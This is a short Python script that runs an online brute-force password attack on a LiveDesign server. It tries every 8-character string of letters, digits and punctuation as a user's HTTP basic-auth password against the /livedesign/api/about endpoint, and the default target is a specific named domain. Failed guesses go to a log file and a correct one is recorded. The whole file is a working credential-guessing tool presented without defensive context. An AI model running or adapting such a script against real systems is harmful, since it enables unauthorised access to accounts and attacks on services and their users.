"""
execute file using
python3 guessing.py -d <domain> -u <username>
"""
import argparse
import itertools
import logging
import requests
import string
import sys

from time import time


def get_args(argv):
    parser = argparse.ArgumentParser(
        usage='Guessing code',
        description=__doc__)
    group = parser.add_mutually_exclusive_group()
    group.add_argument(
        '--domain', '-d',
        default='master.dev.bb.schrodinger.com',
        dest='domain',
        help='domain name is "master.dev.bb.schrodinger.com" if not declared'
    )
    optionalarg = parser._action_groups.pop()
    requiredarg = parser.add_argument_group('required arguments')
    requiredarg.add_argument(
        '--user', '-u',
        dest='user',
        help='specify user'
    )
    parser._action_groups.append(optionalarg)

    return parser.parse_args(argv)


def setup_logging(username):
    logging.basicConfig(format='%(message)s', filename='{}.log'.format(username), level=logging.INFO)
    # lower requests logging level to not write INFO messages
    logging.getLogger("requests").setLevel(logging.WARNING)


def livedesign_about(ld_url, username, password):
    """ Pulls information from the LiveDesign livedesign/api/about page
    """
    about = 'https://' + ld_url + '/livedesign/api/about'
    r = requests.get(about, auth=(username, password))
    if r.status_code == 200:
        return True
    return False


def guess(string_of_characters, guess_length, domain, user):
    for word in itertools.product(string_of_characters, repeat=guess_length):
        skip = True if len(set(word)) < 7 else False
        if skip:
            continue

        word = ''.join(word)

        # check status
        success = livedesign_about(domain, user, word)

        # if incorrect write password to document
        if success:
            return word

        logging.info(word)

    return False


def main(arguments=sys.argv[1:]):
    args = get_args(arguments)
    # user & server data
    user = args.user
    domain = args.domain
    guess_len = 8

    setup_logging(user)

    # Create punctuation, ascii_letters, digits string
    char = string.ascii_letters + string.digits + string.punctuation

    # Format top of file with "Incorrect guesses:\n"
    logging.info("{}\n{}\n\nIncorrect guesses:".format(domain, user))

    # if correct write "Correct guess:\n" & password guessed
    password = guess(char, guess_len, domain, user)
    if password:
        logging.info('\nCorrect guess: {}\n'.format(password))
    else:
        logging.info('\nNO SUCCESSFUL GUESSES\n')


if __name__ == "__main__":
    timer = time()
    main()
    timer = time() - timer
    logging.info("EXECUTION TIME = {}\n".format(timer))

